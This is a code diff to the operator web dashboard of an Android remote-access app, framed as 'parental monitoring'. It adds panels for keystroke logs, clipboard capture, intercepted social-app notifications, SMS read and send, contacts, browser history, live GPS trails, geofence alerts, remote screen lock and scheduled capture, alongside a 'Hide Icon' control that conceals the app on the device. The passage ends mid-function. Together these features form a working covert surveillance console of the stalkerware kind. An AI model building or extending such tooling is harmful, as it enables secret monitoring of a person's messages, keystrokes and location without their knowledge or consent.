@@ -345,6 +345,10 @@
             gap: 6px;
             box-shadow: var(--shadow-sm);
         }
+        .device-card.active {
+            border-color: #1976ff;
+            box-shadow: 0 0 0 2px rgba(25,118,255,0.25);
+        }
         .device-card:hover {
             border-color: var(--primary-color);
             box-shadow: 0 4px 16px rgba(25,118,255,0.15);
@@ -1128,19 +1132,44 @@
         <button onclick="stopLiveAudio()" style="display:none;" id="stopLiveAudioBtn"><span>⏹</span> <span>Stop Live Audio</span></button>
 
         <button onclick="sendCommand('GET_LOCATION')"><span>📍</span> <span>GPS Location</span></button>
+        <button onclick="toggleLiveGps()" id="liveGpsBtn"><span>🛰️</span> <span>Live GPS Track</span></button>
     </div>
 
     <div class="section">
         <div class="section-title">Data</div>
         <button onclick="sendCommand('LIST_FILES', { path: 'root' })"><span>📂</span> <span>File Manager</span></button>
-        <button onclick="sendCommand('GET_SMS', { box: 'inbox' })"><span>💬</span> <span>SMS Logs</span></button>
+        <button onclick="sendCommand('GET_SMS', { box: 'inbox' })"><span>💬</span> <span>SMS Inbox</span></button>
+        <button onclick="sendCommand('GET_SMS', { box: 'sent' })"><span>📤</span> <span>SMS Sent</span></button>
         <button onclick="sendCommand('GET_CALL_LOGS')"><span>📞</span> <span>Call Logs</span></button>
+        <button onclick="sendCommand('GET_CONTACTS')"><span>👥</span> <span>Contacts</span></button>
+        <button onclick="sendCommand('GET_BROWSER_HISTORY')"><span>🌐</span> <span>Browser History</span></button>
+        <button onclick="sendCommand('GET_WIFI_NETWORKS')"><span>📶</span> <span>Wi-Fi Networks</span></button>
+    </div>
+
+    <div class="section">
+        <div class="section-title">Monitoring</div>
+        <button onclick="showAppUsagePanel()"><span>📊</span> <span>Screen Time</span></button>
+        <button onclick="sendCommand('GET_NOTIFICATIONS')"><span>🔔</span> <span>Social Messages</span></button>
+        <button onclick="sendCommand('GET_KEYLOG')"><span>⌨️</span> <span>Keyboard Log</span></button>
+        <button onclick="sendCommand('GET_CLIPBOARD')"><span>📋</span> <span>Clipboard</span></button>
+        <button onclick="showGeofencePanel()"><span>🗺️</span> <span>Geofence</span></button>
+        <button onclick="showSchedulePanel()"><span>⏱️</span> <span>Auto Capture</span></button>
     </div>
 
     <div class="section">
         <div class="section-title">Control</div>
         <button onclick="toggleAppIcon()"><span>👻</span> <span id="iconBtn">Hide Icon</span></button>
+        <button onclick="sendCommand('LOCK_DEVICE')"><span>🔒</span> <span>Lock Screen</span></button>
+        <button onclick="showSendSmsPanel()"><span>✉️</span> <span>Send SMS</span></button>
         <button onclick="sendCommand('VIBRATE', { duration: 1000 })"><span>📳</span> <span>Vibrate (1s)</span></button>
+    </div>
+
+    <div id="alertsBadge" style="margin:10px 0;display:none;">
+        <div style="background:#fff3e0;border:1px solid #ff9800;border-radius:8px;padding:10px;font-size:12px;">
+            <strong>⚠️ Alerts</strong>
+            <div id="alertsList" style="margin-top:6px;max-height:150px;overflow:auto;"></div>
+            <button onclick="clearAlerts()" style="margin-top:6px;font-size:11px;padding:3px 8px;background:#ff9800;color:#fff;border:none;border-radius:4px;cursor:pointer;">Clear</button>
+        </div>
     </div>
 </div>
 
@@ -1232,6 +1261,9 @@
 
     // Activity timeline
     let activityTimeline = [];
+
+    // Location history (last 20 points)
+    const locationHistory = [];
 
     // Track pending file downloads
     let pendingDownloads = new Map();
@@ -1946,12 +1978,23 @@
         devices.forEach((device, id) => {
             const card = document.createElement('div');
             card.className = 'device-card';
+            const bat = device.batteryLevel != null ? device.batteryLevel : '?';
+            const batColor = bat >= 50 ? '#4caf50' : bat >= 20 ? '#ff9800' : '#d32f2f';
+            const batIcon = device.batteryCharging ? '⚡' : bat >= 50 ? '🔋' : '🪫';
+            const netIcon = device.networkType === 'WIFI' ? '📶' : device.networkType === 'MOBILE' ? '📡' : '🔌';
+            const lastSeen = device.lastSeen ? new Date(device.lastSeen).toLocaleTimeString() : '';
+            card.className = 'device-card' + (id === currentDeviceId ? ' active' : '');
             card.innerHTML = `
                 <span class="dc-icon">📱</span>
                 <span class="dc-name">${device.name || 'Unknown Device'}</span>
                 <span class="dc-detail">${device.manufacturer || ''} ${device.model || ''}</span>
                 <span class="dc-detail">Android ${device.androidVersion || '?'}</span>
-                <span class="dc-status">● Online</span>
+                <div style="display:flex;align-items:center;gap:8px;margin-top:4px;flex-wrap:wrap;">
+                    <span class="dc-status">● Online</span>
+                    <span style="font-size:11px;color:${batColor};">${batIcon} ${bat}%</span>
+                    <span style="font-size:11px;color:#7b8a9b;">${netIcon}</span>
+                    ${lastSeen ? `<span style="font-size:10px;color:#bbb;">${lastSeen}</span>` : ''}
+                </div>
             `;
             card.onclick = () => switchDevice(id);
             grid.appendChild(card);
@@ -1967,6 +2010,7 @@
 
         currentDeviceId = deviceId;
         showWelcomeMessage(false);
+        updateDeviceGrid(); // re-render to show active highlight
 
         if (ws && ws.readyState === WebSocket.OPEN) {
             ws.send(JSON.stringify({
@@ -2327,6 +2371,7 @@
         switch (json.type) {
             case 'DEVICE_REGISTRATION':
                 handleDeviceRegistration(json);
+                updateDeviceGrid();
                 break;
 
             case 'DEVICE_LIST':
@@ -2337,11 +2382,36 @@
                     });
                 }
                 updateDeviceSelector();
+                updateDeviceGrid();
+                // Refresh battery for current device
+                if (currentDeviceId) {
+                    const curDev = devices.get(currentDeviceId);
+                    if (curDev && curDev.batteryLevel != null) {
+                        updateBatteryInfo(curDev.batteryLevel, curDev.batteryCharging || false);
+                    }
+                }
                 if (devices.size > 0 && !currentDeviceId) {
                     const firstId = devices.keys().next().value;
                     switchDevice(firstId);
                 }
                 break;
+
+            case 'DEVICE_OFFLINE': {
+                const offId = json.deviceId;
+                const offName = devices.get(offId)?.name || offId;
+                devices.delete(offId);
+                updateDeviceSelector();
+                updateDeviceGrid();
+                logActivity(`Device offline: ${offName}`);
+                showNotification(`📴 ${offName} disconnected`);
+                if (currentDeviceId === offId) {
+                    currentDeviceId = null;
+                    setStatus('OFFLINE');
+                    panel.innerHTML = '<div id="welcomeMessage"><div id="devicePickerScreen" style="padding:40px 20px;text-align:center;"><div style="font-size:48px;margin-bottom:16px;">📴</div><h2 style="font-size:20px;">Device Disconnected</h2><p style="color:#7b8a9b;">Select another device.</p><div id="deviceGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;max-width:700px;margin:20px auto;text-align:left;"></div></div></div>';
+                    updateDeviceGrid();
+                }
+                break;
+            }
 
             case 'DEVICE_INFO':
                 // Device is actually paired and responding — now set ONLINE
@@ -2352,9 +2422,12 @@
                 }
                 break;
 
-            case 'INSTALLED_APPS':
-                displayInstalledApps(json.data);
+            case 'INSTALLED_APPS': {
+                const appsData = parseDataField(json.data);
+                if (Array.isArray(appsData)) displayInstalledApps(appsData);
+                else panel.innerHTML = '<p style="color:red">Could not parse apps list</p>';
                 break;
+            }
 
             case 'FILE_DELETED':
                 showNotification('File deleted');
@@ -2387,10 +2460,16 @@
                 logActivity('File list received');
                 break;
 
-            case 'LOCATION_UPDATE':
-                renderMap(parseDataField(json.data));
+            case 'LOCATION_UPDATE': {
+                const locData = parseDataField(json.data);
+                if (locData) {
+                    locationHistory.unshift({ ...locData, receivedAt: Date.now() });
+                    if (locationHistory.length > 20) locationHistory.pop();
+                    renderMap(locData);
+                }
                 logActivity('Location update received');
                 break;
+            }
 
             case 'CAMERA_IMAGE':
                 displayCapturedImage(json.data);
@@ -2402,10 +2481,117 @@
                 logActivity('Audio recording received');
                 break;
 
-            case 'ERROR':
-                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
+            case 'CONTACTS_DATA':
+                logActivity('Received contacts');
+                displayContacts(parseDataField(json.data) ?? json.data);
+                break;
+            case 'APP_USAGE_DATA':
+                logActivity('Received app usage');
+                displayAppUsage(parseDataField(json.data) ?? json.data);
+                break;
+            case 'NOTIFICATIONS_DATA':
+                logActivity('Received social messages');
+                displayNotifications(parseDataField(json.data) ?? json.data);
+                break;
+            case 'NOTIFICATIONS_CLEARED':
+                showNotification('Notifications cleared');
+                break;
+            case 'BROWSER_HISTORY_DATA':
+                logActivity('Received browser history');
+                displayBrowserHistory(parseDataField(json.data) ?? json.data);
+                break;
+            case 'KEYLOG_DATA':
+                logActivity('Received keyboard log');
+                displayKeylog(parseDataField(json.data) ?? json.data);
+                break;
+            case 'KEYLOG_CLEARED':
+                showNotification('Keylog cleared');
+                break;
+            case 'CLIPBOARD_DATA':
+                logActivity('Received clipboard');
+                displayClipboard(parseDataField(json.data) ?? json.data);
+                break;
+            case 'WIFI_NETWORKS_DATA':
+                logActivity('Received Wi-Fi networks');
+                displayWifiNetworks(parseDataField(json.data) ?? json.data);
+                break;
+            case 'GEOFENCE_SET':
+                showNotification('✅ Geofence activated');
+                logActivity('Geofence set');
+                break;
+            case 'GEOFENCE_CLEARED':
+                showNotification('Geofence cleared');
+                break;
+            case 'GEOFENCE_INFO': {
+                const gf = json.data;
+                if (gf && gf.active) {
+                    panel.innerHTML = `
+                        <h3>🗺️ Geofence Status</h3>
+                        <div style="background:#e8f5e9;border:1px solid #4caf50;border-radius:10px;padding:16px;margin-top:12px;max-width:360px;">
+                            <div style="font-size:14px;color:#2e7d32;font-weight:700;margin-bottom:8px;">● Active Geofence</div>
+                            <div style="font-size:13px;margin-bottom:4px;">📍 Centre: ${gf.lat.toFixed(5)}, ${gf.lon.toFixed(5)}</div>
+                            <div style="font-size:13px;margin-bottom:12px;">📏 Radius: ${gf.radius}m</div>
+                            <div style="display:flex;gap:8px;">
+                                <button onclick="sendCommand('CLEAR_GEOFENCE')"
+                                    style="padding:6px 14px;background:#d32f2f;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px;">
+                                    🗑 Clear Fence
+                                </button>
+                                <button onclick="showGeofencePanel()"
+                                    style="padding:6px 14px;background:#1976ff;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px;">
+                                    ✏️ Edit
+                                </button>
+                            </div>
+                        </div>`;
+                } else {
+                    panel.innerHTML = `<h3>🗺️ Geofence Status</h3>
+                        <div style="color:#999;margin-top:12px;">No active geofence. Click "Geofence" in the sidebar to set one.</div>`;
+                }
+                break;
+            }
+            case 'GEOFENCE_ALERT': {
+                const alertMsg = json.event === 'EXIT' ? '🚨 DEVICE LEFT the safe zone!' : '✅ Device returned to safe zone';
+                pushAlert('Geofence', alertMsg);
+                logActivity('GEOFENCE ' + json.event);
+                break;
+            }
+            case 'SCHEDULED_CAPTURE_SET':
+                showNotification('Auto-capture started');
+                break;
+            case 'SCHEDULED_CAPTURE_STOPPED':
+                showNotification('Auto-capture stopped');
+                break;
+            case 'DEVICE_LOCKED':
+                showNotification('🔒 Screen locked');
+                logActivity('Device locked remotely');
+                break;
+            case 'SMS_SENT':
+                showNotification('✅ SMS sent successfully');
+                break;
+
+            case 'GPS_UPDATES_STOPPED':
+                liveGpsActive = false;
+                {
+                    const btn = document.getElementById('liveGpsBtn');
+                    if (btn) {
+                        btn.querySelector('span:last-child').textContent = 'Live GPS Track';
+                        btn.style.background = '';
+                        btn.style.color = '';
+                    }
+                }
+                showNotification('GPS tracking stopped by device');
+                logActivity('GPS updates stopped');
+                break;
+
+            case 'ERROR': {
+                // Sanitize [object Event] etc.
+                let errText = (json.error || '').toString().trim();
+                if (!errText || errText === '[object Event]' || errText === '[object ErrorEvent]') {
+                    errText = 'Connection error — check device is online.';
+                }
+                panel.innerHTML = `<div style="color:#d32f2f;">⚠ ${errText}</div>`;
                 logActivity(`Error: ${json.error}`);
                 break;
+            }
 
             case 'APP_HIDDEN':
                 iconHidden = true;
@@ -2742,6 +2928,16 @@
             <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
             <div>📡 Provider: ${loc.provider || 'unknown'}</div>
             <div class="addr">🌍 Loading address...</div>
+            <div style="margin-top:8px;display:flex;gap:8px;flex-wrap:wrap;">
+                <button onclick="useLocationAsGeofence(${loc.lat},${loc.lon})"
+                    style="padding:5px 12px;background:#4caf50;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px;">
+                    🗺️ Set Geofence Here
+                </button>
+                <a href="https://maps.google.com/?q=${loc.lat},${loc.lon}" target="_blank"
+                    style="padding:5px 12px;background:#1976ff;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px;text-decoration:none;">
+                    Open in Google Maps
+                </a>
+            </div>
         `;
         mapDiv.appendChild(infoDiv);
 
@@ -2762,6 +2958,19 @@
             console.error('Geocoding error:', err);
             infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
         });
+
+        // Draw location history trail on map
+        if (locationHistory.length > 1) {
+            const trail = locationHistory.map(p => [p.lat, p.lon]);
+            L.polyline(trail, { color: '#1976ff', weight: 2, opacity: 0.5 }).addTo(mapInstance);
+            // Mark older points smaller
+            locationHistory.slice(1).forEach((p, i) => {
+                L.circleMarker([p.lat, p.lon], {
+                    radius: 4, color: '#1976ff', fillColor: '#90caf9',
+                    fillOpacity: 0.7, weight: 1
+                }).bindPopup(`#${i+2}: ${new Date(p.receivedAt).toLocaleTimeString()}`).addTo(mapInstance);
+            });
+        }
     }
 
     function connectWebSocket() {
@@ -2898,6 +3107,7 @@
     window.updateSelected = updateSelected;
     window.downloadSelected = downloadSelected;
     window.connectWebSocket = connectWebSocket;
+    window.snapScreenFromModal = snapScreenFromModal;
     window.snapScreen = snapScreenFromModal;
     window.getInstalledApps = getInstalledApps;
     window.uninstallApp = uninstallApp;
@@ -2909,10 +3119,478 @@
     window.showActivityTimeline = showActivityTimeline;
     window.clearCameraPanel = clearCameraPanel;
     window.disconnectDevice = disconnectDevice;
+    // ── New parental monitoring functions ──────────────────────────────
+    window.showAppUsagePanel = showAppUsagePanel;
+    window.showGeofencePanel = showGeofencePanel;
+    window.showSchedulePanel = showSchedulePanel;
+    window.showSendSmsPanel = showSendSmsPanel;
+    window.setGeofence = setGeofence;
+    window.useLocationAsGeofence = useLocationAsGeofence;
+    window.doSendSms = doSendSms;
+    window.startScheduledCapture = startScheduledCapture;
+    window.filterNotifApp = filterNotifApp;
+    window.filterTable = filterTable;
+    window.clearAlerts = clearAlerts;
+    window.pushAlert = pushAlert;
+    window.toggleLiveGps = toggleLiveGps;
 
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
 
     connectWebSocket();
-</script>
+
+    // ════════════════════════════════════════════════════════════════════════
+    // PARENTAL MONITORING — NEW FEATURES
+    // ════════════════════════════════════════════════════════════════════════
+
+    // ── Alerts system ────────────────────────────────────────────────────────
+    const alerts = [];
+
+    function pushAlert(title, body, type = 'warning') {
+        const time = new Date().toLocaleTimeString();
+        alerts.unshift({ title, body, type, time });
+        if (alerts.length > 50) alerts.pop();
+        renderAlerts();
+        showNotification('⚠️ ' + title + ': ' + body);
+    }
+
+    function renderAlerts() {
+        const list = document.getElementById('alertsList');
+        const badge = document.getElementById('alertsBadge');
+        if (!list) return;
+        badge.style.display = alerts.length ? 'block' : 'none';
+        list.innerHTML = alerts.map(a =>
+            `<div style="margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px;">
+                <strong>${a.time}</strong> ${a.title}: ${a.body}
+            </div>`
+        ).join('');
+    }
+
+    function clearAlerts() {
+        alerts.length = 0;
+        renderAlerts();
+    }
+
+    // ── Contacts viewer ──────────────────────────────────────────────────────
+    function displayContacts(data) {
+        let contacts;
+        try { contacts = typeof data === 'string' ? JSON.parse(data) : data; }
+        catch(e) { panel.innerHTML = '<p style="color:red">Failed to parse contacts</p>'; return; }
+
+        if (contacts.error) { panel.innerHTML = `<p style="color:red">${contacts.error}</p>`; return; }
+
+        const searchId = 'contactSearch_' + Date.now();
+        let html = `
+            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:8px;">
+                <h3 style="margin:0;">👥 Contacts (${contacts.length})</h3>
+                <input id="${searchId}" type="text" placeholder="Search name or number…"
+                    style="padding:6px 10px;border:1px solid #ddd;border-radius:8px;font-size:13px;min-width:200px;"
+                    oninput="filterTable('${searchId}','contactsTableBody')">
+            </div>
+            <div style="overflow-x:auto;">
+            <table style="width:100%;border-collapse:collapse;font-size:13px;">
+                <thead><tr style="background:#f5f7fa;text-align:left;">
+                    <th style="padding:8px;border-bottom:2px solid #e0e4e8;">Name</th>
+                    <th style="padding:8px;border-bottom:2px solid #e0e4e8;">Number</th>
+                    <th style="padding:8px;border-bottom:2px solid #e0e4e8;">Type</th>
+                    <th style="padding:8px;border-bottom:2px solid #e0e4e8;">Times Called</th>
+                </tr></thead>
+                <tbody id="contactsTableBody">`;
+
+        contacts.forEach(c => {
+            html += `<tr style="border-bottom:1px solid #f0f0f0;">
+                <td style="padding:7px 8px;">${c.name || ''}</td>
+                <td style="padding:7px 8px;font-family:monospace;">${c.number || ''}</td>
+                <td style="padding:7px 8px;color:#7b8a9b;">${c.type || ''}</td>
+                <td style="padding:7px 8px;">${c.timesContacted || 0}</td>
+            </tr>`;
+        });
+
+        html += '</tbody></table></div>';
+        panel.innerHTML = html;
+    }
+
+    // ── App usage / screen time ──────────────────────────────────────────────
+    function showAppUsagePanel() {
+        panel.innerHTML = `
+            <h3>📊 Screen Time</h3>
+            <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px;">
+                <button onclick="sendCommand('GET_APP_USAGE',{days:1})" style="padding:8px 16px;border-radius:8px;background:#1976ff;color:#fff;border:none;cursor:pointer;">Today</button>
+                <button onclick="sendCommand('GET_APP_USAGE',{days:7})" style="padding:8px 16px;border-radius:8px;background:#1976ff;color:#fff;border:none;cursor:pointer;">Last 7 Days</button>
+                <button onclick="sendCommand('GET_APP_USAGE',{days:30})" style="padding:8px 16px;border-radius:8px;background:#1976ff;color:#fff;border:none;cursor:pointer;">Last 30 Days</button>
+            </div>
+            <p style="color:#999;font-size:13px;">⚠️ Requires PACKAGE_USAGE_STATS permission — enable in Settings → Apps → Special App Access → Usage Access</p>`;
+    }
+
+    function displayAppUsage(data) {
+        let apps;
+        try { apps = typeof data === 'string' ? JSON.parse(data) : data; }
+        catch(e) { panel.innerHTML = '<p style="color:red">Parse error</p>'; return; }
+
+        if (apps.error) { panel.innerHTML = `<p style="color:red">${apps.error}</p>`; return; }
+
+        // Simple bar chart
+        const maxMs = apps.length > 0 ? apps[0].totalTimeMs : 1;
+        let html = `<h3>📊 Screen Time (${apps.length} apps)</h3>
+            <div style="overflow-x:auto;">
+            <table style="width:100%;border-collapse:collapse;font-size:13px;">
+                <thead><tr style="background:#f5f7fa;">
+                    <th style="padding:8px;text-align:left;">App</th>
+                    <th style="padding:8px;text-align:left;">Usage</th>
+                    <th style="padding:8px;min-width:120px;text-align:left;">Bar</th>
+                </tr></thead><tbody>`;
+
+        apps.forEach(a => {
+            const pct = Math.max(2, Math.round((a.totalTimeMs / maxMs) * 100));
+            const color = a.totalTimeMs > 3600000 ? '#d32f2f' : a.totalTimeMs > 1800000 ? '#ff9800' : '#4caf50';
+            html += `<tr style="border-bottom:1px solid #f0f0f0;">
+                <td style="padding:7px 8px;">${a.appName}</td>
+                <td style="padding:7px 8px;white-space:nowrap;font-weight:600;">${a.totalTimeFmt}</td>
+                <td style="padding:7px 8px;">
+                    <div style="height:10px;background:${color};border-radius:5px;width:${pct}%;min-width:4px;"></div>
+                </td>
+            </tr>`;
+        });
+
+        html += '</tbody></table></div>';
+        panel.innerHTML = html;
+    }
+
+    // ── Social / notification messages ───────────────────────────────────────
+    function displayNotifications(data) {
+        let notifs;
+        try { notifs = typeof data === 'string' ? JSON.parse(data) : data; }
+        catch(e) { panel.innerHTML = '<p style="color:red">Parse error</p>'; return; }
+
+        if (!Array.isArray(notifs) || notifs.length === 0) {
+            panel.innerHTML = `<h3>🔔 Social Messages</h3>
+                <p style="color:#999;margin-top:16px;">No messages captured yet. Make sure the Notification Listener is enabled in Settings → Apps → Special App Access → Notification Access.</p>
+                <button onclick="sendCommand('CLEAR_NOTIFICATIONS')" style="margin-top:12px;padding:8px 16px;background:#d32f2f;color:#fff;border:none;border-radius:8px;cursor:pointer;">Clear All</button>`;
+            return;
+        }
+
+        const apps = [...new Set(notifs.map(n => n.app))];
+        let html = `
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;flex-wrap:wrap;gap:8px;">
+                <h3 style="margin:0;">🔔 Social Messages (${notifs.length})</h3>
+                <button onclick="sendCommand('CLEAR_NOTIFICATIONS')" style="padding:6px 14px;background:#d32f2f;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:12px;">Clear All</button>
+            </div>
+            <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px;">
+                <button onclick="filterNotifApp('ALL')" class="notif-filter-btn" style="padding:4px 10px;background:#1976ff;color:#fff;border:none;border-radius:12px;cursor:pointer;font-size:12px;">All</button>
+                ${apps.map(a => `<button onclick="filterNotifApp('${a}')" class="notif-filter-btn" style="padding:4px 10px;background:#e3f2fd;color:#1976ff;border:none;border-radius:12px;cursor:pointer;font-size:12px;">${a}</button>`).join('')}
+            </div>
+            <div id="notifList">`;
+
+        // Show newest first
+        [...notifs].reverse().forEach(n => {
+            html += `<div class="notif-item" data-app="${n.app}" style="background:#fff;border:1px solid #e8e8e8;border-radius:8px;padding:10px 12px;margin-bottom:8px;">
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+                    <span style="font-weight:700;font-size:13px;">${n.app}</span>
+                    <span style="color:#aaa;font-size:11px;">${n.timeFmt}</span>
+                </div>
+                <div style="font-size:13px;color:#555;font-weight:600;">${n.title}</div>
+                <div style="font-size:13px;color:#333;margin-top:2px;">${n.text}</div>
+            </div>`;
+        });
+
+        html += '</div>';
+        panel.innerHTML = html;
+    }
+
+    function filterNotifApp(app) {
+        document.querySelectorAll('.notif-item').forEach(el => {
+            el.style.display = (app === 'ALL' || el.dataset.app === app) ? 'block' : 'none';
+        });
+    }
+
+    // ── Keylog viewer ────────────────────────────────────────────────────────
+    function displayKeylog(data) {
+        let entries;
+        try { entries = typeof data === 'string' ? JSON.parse(data) : data; }
+        catch(e) { panel.innerHTML = '<p style="color:red">Parse error</p>'; return; }
+
+        if (!Array.isArray(entries) || entries.length === 0) {
+            panel.innerHTML = `<h3>⌨️ Keyboard Log</h3>
+                <p style="color:#999;margin-top:16px;">No keystrokes captured yet. Requires Accessibility Service enabled.</p>`;
+            return;
+        }
+
+        let html = `
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
+                <h3 style="margin:0;">⌨️ Keyboard Log (${entries.length})</h3>
+                <button onclick="sendCommand('CLEAR_KEYLOG')" style="padding:6px 14px;background:#d32f2f;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:12px;">Clear</button>
+            </div>
+            <div style="overflow-x:auto;">
+            <table style="width:100%;border-collapse:collapse;font-size:13px;">
+                <thead><tr style="background:#f5f7fa;">
+                    <th style="padding:8px;text-align:left;">Time</th>
+                    <th style="padding:8px;text-align:left;">App</th>
+                    <th style="padding:8px;text-align:left;">Field</th>
+                    <th style="padding:8px;text-align:left;">Text</th>
+                </tr></thead><tbody>`;
+
+        [...entries].reverse().forEach(e => {
+            html += `<tr style="border-bottom:1px solid #f0f0f0;">
+                <td style="padding:6px 8px;white-space:nowrap;color:#999;font-size:11px;">${e.timeFmt}</td>
+                <td style="padding:6px 8px;">${e.pkg || ''}</td>
+                <td style="padding:6px 8px;color:#7b8a9b;">${e.field || ''}</td>
+                <td style="padding:6px 8px;font-family:monospace;">${e.text || ''}</td>
+            </tr>`;
+        });
+
+        html += '</tbody></table></div>';
+        panel.innerHTML = html;
+    }
+
+    // ── Browser history viewer ───────────────────────────────────────────────
+    function displayBrowserHistory(data) {
+        let items;
+        try { items = typeof data === 'string' ? JSON.parse(data) : data; }
+        catch(e) { panel.innerHTML = '<p style="color:red">Parse error</p>'; return; }
+
+        if (items.error) { panel.innerHTML = `<h3>🌐 Browser History</h3><p style="color:#999;">${items.error}</p>`; return; }
+        if (!Array.isArray(items) || items.length === 0) {
+            panel.innerHTML = '<h3>🌐 Browser History</h3><p style="color:#999;">No history found.</p>'; return;
+        }
+
+        let html = `<h3>🌐 Browser History (${items.length})</h3>
+            <div style="overflow-x:auto;">
+            <table style="width:100%;border-collapse:collapse;font-size:13px;">
+                <thead><tr style="background:#f5f7fa;">
+                    <th style="padding:8px;text-align:left;">Time</th>
+                    <th style="padding:8px;text-align:left;">Title</th>
+                    <th style="padding:8px;text-align:left;">URL</th>
+                    <th style="padding:8px;">Visits</th>
+                </tr></thead><tbody>`;
+
+        items.forEach(i => {
+            html += `<tr style="border-bottom:1px solid #f0f0f0;">
+                <td style="padding:6px 8px;white-space:nowrap;font-size:11px;color:#999;">${i.date}</td>
+                <td style="padding:6px 8px;">${i.title || ''}</td>
+                <td style="padding:6px 8px;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">
+                    <a href="${i.url}" target="_blank" style="color:#1976ff;text-decoration:none;">${i.url}</a>
+                </td>
+                <td style="padding:6px 8px;text-align:center;">${i.visits || 0}</td>
+            </tr>`;
+        });
+
+        html += '</tbody></table></div>';
+        panel.innerHTML = html;
+    }
+
+    // ── Wi-Fi networks viewer ────────────────────────────────────────────────
+    function displayWifiNetworks(data) {
+        let nets;
+        try { nets = typeof data === 'string' ? JSON.parse(data) : data; }
+        catch(e) { panel.innerHTML = '<p style="color:red">Parse error</p>'; return; }
+
+        if (!Array.isArray(nets) || nets.length === 0) {
+            panel.innerHTML = '<h3>📶 Wi-Fi Networks</h3><p style="color:#999;">No networks found.</p>'; return;
+        }
+
+        let html = `<h3>📶 Wi-Fi Networks (${nets.length})</h3>
+            <div style="overflow-x:auto;">
+            <table style="width:100%;border-collapse:collapse;font-size:13px;">
+                <thead><tr style="background:#f5f7fa;">
+                    <th style="padding:8px;text-align:left;">SSID</th>
+                    <th style="padding:8px;text-align:left;">BSSID</th>
+                    <th style="padding:8px;">Signal</th>
+                    <th style="padding:8px;">Status</th>
+                </tr></thead><tbody>`;
+
+        nets.forEach(n => {
+            const bars = n.rssi > -50 ? '████' : n.rssi > -70 ? '███░' : n.rssi > -80 ? '██░░' : '█░░░';
+            html += `<tr style="border-bottom:1px solid #f0f0f0;${n.connected ? 'background:#f0fff4;' : ''}">
+                <td style="padding:7px 8px;font-weight:${n.connected ? 700 : 400};">${n.ssid || '(hidden)'}</td>
+                <td style="padding:7px 8px;font-family:monospace;font-size:11px;color:#999;">${n.bssid || ''}</td>
+                <td style="padding:7px 8px;text-align:center;font-family:monospace;letter-spacing:-1px;color:#1976ff;">${bars} ${n.rssi}dBm</td>
+                <td style="padding:7px 8px;text-align:center;">${n.connected ? '<span style="color:#4caf50;font-weight:700;">● Connected</span>' : '<span style="color:#ccc;">○ Near</span>'}</td>
+            </tr>`;
+        });
+
+        html += '</tbody></table></div>';
+        panel.innerHTML = html;
+    }
+
+    // ── Clipboard viewer ─────────────────────────────────────────────────────
+    function displayClipboard(data) {
+        let clip;
+        try { clip = typeof data === 'string' ? JSON.parse(data) : data; }
+        catch(e) { panel.innerHTML = '<p style="color:red">Parse error</p>'; return; }
+
+        panel.innerHTML = `
+            <h3>📋 Clipboard</h3>
+            <div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;margin-top:12px;">
+                <div style="font-size:11px;color:#999;margin-bottom:6px;">Type: <strong>${clip.type || 'unknown'}</strong></div>
+                <div style="font-family:monospace;font-size:14px;word-break:break-all;line-height:1.6;">
+                    ${clip.content || '<em style="color:#ccc">Empty</em>'}
+                </div>
+            </div>`;
+    }
+
+    // ── Geofence panel ───────────────────────────────────────────────────────
+    function showGeofencePanel() {
+        panel.innerHTML = `
+            <h3>🗺️ Geofence — Safety Zone</h3>
+            <p style="color:#666;font-size:13px;margin-bottom:16px;">Set a zone on the map. You'll get an alert when the device exits the boundary.</p>
+            <div id="geofenceMap" style="width:100%;height:320px;border-radius:10px;margin-bottom:14px;"></div>
+            <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
+                <div>
+                    <label style="font-size:12px;color:#999;">Latitude</label>
+                    <input id="gfLat" type="number" step="0.000001" style="display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;width:140px;" placeholder="e.g. 20.2961">
+                </div>
+                <div>
+                    <label style="font-size:12px;color:#999;">Longitude</label>
+                    <input id="gfLon" type="number" step="0.000001" style="display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;width:140px;" placeholder="e.g. 85.8245">
+                </div>
+                <div>
+                    <label style="font-size:12px;color:#999;">Radius (m)</label>
+                    <input id="gfRadius" type="number" value="500" style="display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;width:100px;">
+                </div>
+                <div style="align-self:flex-end;display:flex;gap:8px;">
+                    <button onclick="setGeofence()" style="padding:8px 18px;background:#4caf50;color:#fff;border:none;border-radius:8px;cursor:pointer;">Set Fence</button>
+                    <button onclick="sendCommand('CLEAR_GEOFENCE')" style="padding:8px 18px;background:#d32f2f;color:#fff;border:none;border-radius:8px;cursor:pointer;">Clear</button>
+                    <button onclick="sendCommand('GET_GEOFENCE')" style="padding:8px 18px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;">Status</button>
+                </div>
+            </div>`;
+
+        // Init small Leaflet map for picking location
+        setTimeout(() => {
+            try {
+                const mapEl = document.getElementById('geofenceMap');
+                if (!mapEl) return;
+                const m = L.map('geofenceMap').setView([20.5937, 78.9629], 5);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);
+                let marker, circle;
+                m.on('click', e => {
+                    const { lat, lng } = e.latlng;
+                    document.getElementById('gfLat').value = lat.toFixed(6);
